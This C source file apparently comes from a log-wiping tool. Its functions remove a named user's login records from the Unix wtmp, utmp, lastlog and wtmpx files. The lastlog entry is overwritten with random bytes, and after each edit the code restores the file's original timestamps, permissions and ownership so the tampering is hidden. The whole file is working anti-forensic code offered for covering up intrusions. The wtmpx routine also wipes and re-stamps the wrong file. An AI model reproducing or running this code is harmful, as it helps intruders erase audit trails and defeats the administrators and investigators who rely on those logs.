#include <swipe.h>

/*
 * function : wipe_wtmp()
 * purpose  : wipe username from wtmp log file
 * arguments: username to wipe, tty to wipe
 * returns  : void
 */

void wipe_wtmp(char *username)
{
  int i;			/* PROG: general purpose counter */
  int j;			/* PROG: general purpose counter */
  int wtmpfd;			/* PROG: fd for wtmp file        */
  int newfd;			/* PROG: fd for new wtmp file    */
  struct utmp ut_utmp;		/* PROG: utmp entry information  */
  struct stat st_stat;		/* PROG: file statistics         */
  struct fstats fstats;		/* PROG: saved file statistics   */

  /*
   * open WTMP and get file attributes
   */

  if((wtmpfd = open(_PATH_WTMP, O_RDONLY)) < 0) {
    printf("ERROR: failed to open() wtmp\n");
    return;
  }

  if(fstat(wtmpfd, &st_stat) < 0) {
    printf("ERROR: unable to stat() wtmp\n");
    return;
  }

  fstats.uid = st_stat.st_uid;
  fstats.gid = st_stat.st_gid;
  fstats.mode = st_stat.st_mode;
  fstats.time.actime = st_stat.st_atime;
  fstats.time.modtime = st_stat.st_mtime;

  /*
   * open temporary WTMP file
   */

  if((newfd = open("/tmp/.nwtmp", O_CREAT | O_WRONLY, 0600)) < 0) {
    printf("ERROR: open() failed\n");
    return;
  }

  /*
   * find the last entry for username and save index value
   */

  printf("removing '%s' from WTMP\t: ....................", username);

  for(i = 0; read(wtmpfd, &ut_utmp, sizeof(ut_utmp)) > 0;)
    if(!strcmp(ut_utmp.ut_name, username))
      i++;

  /*
   * rewind the WTMP file
   */

  lseek(wtmpfd, -(long)(st_stat.st_size), SEEK_END);

  /*
   * omit the last username entry from the new WTMP file
   */

  for(j = 0; read(wtmpfd, &ut_utmp, sizeof(ut_utmp)) > 0;) {

    if(!strcmp(ut_utmp.ut_name, username)) {
      j++;
      if(j == i)
        continue;
    }

    write(newfd, &ut_utmp, sizeof(ut_utmp));
  }

  /*
   * wipe original WTMP file
   */

  close(wtmpfd);
  wipe(_PATH_WTMP);

  puts(" complete");

  /*
   * replace new WTMP with old WTMP and set file attributes
   */

  rename("/tmp/.nwtmp", _PATH_WTMP);

  utime(_PATH_WTMP, &fstats.time);
  chmod(_PATH_WTMP, fstats.mode);
  chown(_PATH_WTMP, fstats.uid, fstats.gid);

  close(newfd);
}

/*
 * function : wipe_utmp()
 * purpose  : remove a username from UTMP
 * arguments: username and tty
 * returns  : void
 */

void wipe_utmp(char *username, char *tty)
{
  int match;			/* PROG: matching flag            */
  int newfd;			/* PROG: new UTMP file descriptor */
  int utmpfd;			/* PROG: UTMP file descriptor     */
  struct utmp ut_utmp;		/* PROG: utmp entry information   */
  struct stat st_stat;		/* PROG: file statistics          */
  struct fstats fstats;		/* PROG: saved file statistics    */

  /*
   * open UTMP file and get file attributes
   */

  if((utmpfd = open(_PATH_UTMP, O_RDONLY)) < 0) {
    printf("ERROR: unable to open() utmp\n");
    return;
  }

  if(fstat(utmpfd, &st_stat) < 0) {
    printf("ERROR: unable to stat() utmp\n");
    return;
  }

  fstats.uid = st_stat.st_uid;
  fstats.gid = st_stat.st_gid;
  fstats.mode = st_stat.st_mode;
  fstats.time.actime = st_stat.st_atime;
  fstats.time.modtime = st_stat.st_mtime;

  /*
   * open temporary UTMP file
   */

  if((newfd = open("/tmp/.nutmp", O_CREAT | O_WRONLY, 0600)) < 0) {
    printf("ERROR: unable to open() temporary utmp\n");
    return;
  }

  /*
   * traverse through UTMP, looking for removable entries
   */

  printf("removing '%s' from UTMP\t: ....................", username);

  for(match = 0; read(utmpfd, &ut_utmp, sizeof(ut_utmp)) > 0; match = 0) {
   
    if(!strcmp(ut_utmp.ut_name, username))
      match = 1;

    if(tty)
      if(match && !strcmp(ut_utmp.ut_line, tty))
        continue;

    if(match && !tty)
      continue;

    write(newfd, &ut_utmp, sizeof(ut_utmp));
  }

  /*
   * wipe original UTMP file
   */

  close(utmpfd);
  wipe(_PATH_UTMP);

  puts(" complete");

  /*
   * replace new UTMP with old UTMP and set file attributes
   */

  rename("/tmp/.nutmp", _PATH_UTMP);

  utime(_PATH_UTMP, &fstats.time);
  chmod(_PATH_UTMP, fstats.mode);
  chown(_PATH_UTMP, fstats.uid, fstats.gid);

  close(newfd);
}

/*
 * function : wipe_lastlog()
 * purpose  : remove lastlog entries for a user
 * arguments: username
 * returns  : void
 */

void wipe_lastlog(char *username)
{
  int i;			/* PROG: general program counter      */
  int randfd;			/* PROG: /dev/urandom file descriptor */
  int lastlogfd;                /* PROG: LASTLOG file descriptor      */
  struct lastlog lastlog;	/* PROG: lastlog entry information    */
  struct passwd *passwd;        /* PROG: passwd entry information     */

  /*
   * open LASTLOG file
   */

  if(!(lastlogfd = open(_PATH_LASTLOG, O_RDWR))) {
    printf("ERROR: unable to open() lastlog\n");
    return;
  }

  /*
   * open /dev/urandom 
   */

  if(!(randfd = open("/dev/urandom", O_RDONLY))) {
    printf("ERROR: unable to open /dev/urandom\n");
    return;
  }

  /*
   * get the password file entry
   */

  if(!(passwd = getpwnam(username))) {
    printf("ERROR: unable to get password information\n");
    return;
  }

  /*
   * seek to the correct entry in lastlog
   */

  lseek(lastlogfd, (long)(passwd->pw_uid * sizeof(lastlog)), SEEK_SET);

  /*
   * wipe that area in lastlog n number of times and zero it out
   */

  printf("removing '%s' from LASTLOG\t: ....................", username);

  for(i = 0; i < wipe_num; i++) {
    read(randfd, &lastlog, sizeof(lastlog));
    write(lastlogfd, &lastlog, sizeof(lastlog));
 
    lseek(lastlogfd, -(long)(sizeof(lastlog)), SEEK_CUR);
  }

  memset(&lastlog, 0x0, sizeof(lastlog));
  write(lastlogfd, &lastlog, sizeof(lastlog));

  puts(" complete");

  close(lastlogfd);
  close(randfd);
}

#ifdef _HAVE_WTMPX
 
void wipe_wtmpx(char *username)
{
  int i;			/* PROG: general purpose counter */
  int j;			/* PROG: general purpose counter */
  int wtmpfd;			/* PROG: fd for wtmp file        */
  int newfd;			/* PROG: fd for new wtmp file    */
  struct utmpx ut_utmp;		/* PROG: utmp entry information  */
  struct stat st_stat;		/* PROG: file statistics         */
  struct fstats fstats;		/* PROG: saved file statistics   */

  /*
   * open WTMPX and get file attributes
   */

  if((wtmpfd = open("/var/adm/wtmpx", O_RDONLY)) < 0) {
    printf("ERROR: failed to open() wtmp\n");
    return;
  }

  if(fstat(wtmpfd, &st_stat) < 0) {
    printf("ERROR: unable to stat() wtmp\n");
    return;
  }

  fstats.uid = st_stat.st_uid;
  fstats.gid = st_stat.st_gid;
  fstats.mode = st_stat.st_mode;
  fstats.time.actime = st_stat.st_atime;
  fstats.time.modtime = st_stat.st_mtime;

  /*
   * open temporary WTMP file
   */

  if((newfd = open("/tmp/.nwtmpx", O_CREAT | O_WRONLY, 0600)) < 0) {
    printf("ERROR: open() failed\n");
    return;
  }

  /*
   * find the last entry for username and save index value
   */

  printf("removing '%s' from WTMPX\t: ...................", username);

  for(i = 0; read(wtmpfd, &ut_utmp, sizeof(ut_utmp)) > 0;)
    if(!strcmp(ut_utmp.ut_name, username))
      i++;

  /*
   * rewind the WTMP file
   */

  lseek(wtmpfd, -(long)(st_stat.st_size), SEEK_END);

  /*
   * omit the last username entry from the new WTMP file
   */

  for(j = 0; read(wtmpfd, &ut_utmp, sizeof(ut_utmp)) > 0;) {

    if(!strcmp(ut_utmp.ut_name, username)) {
      j++;
      if(j == i)
        continue;
    }

    write(newfd, &ut_utmp, sizeof(ut_utmp));
  }

  /*
   * wipe original WTMP file
   */

  close(wtmpfd);
  wipe(_PATH_WTMP);

  puts(" complete");

  /*
   * replace new WTMP with old WTMP and set file attributes
   */

  rename("/tmp/.nwtmpx", "/var/adm/wtmpx");

  utime(_PATH_WTMP, &fstats.time);
  chmod(_PATH_WTMP, fstats.mode);
  chown(_PATH_WTMP, fstats.uid, fstats.gid);

  close(newfd);
}

#endif
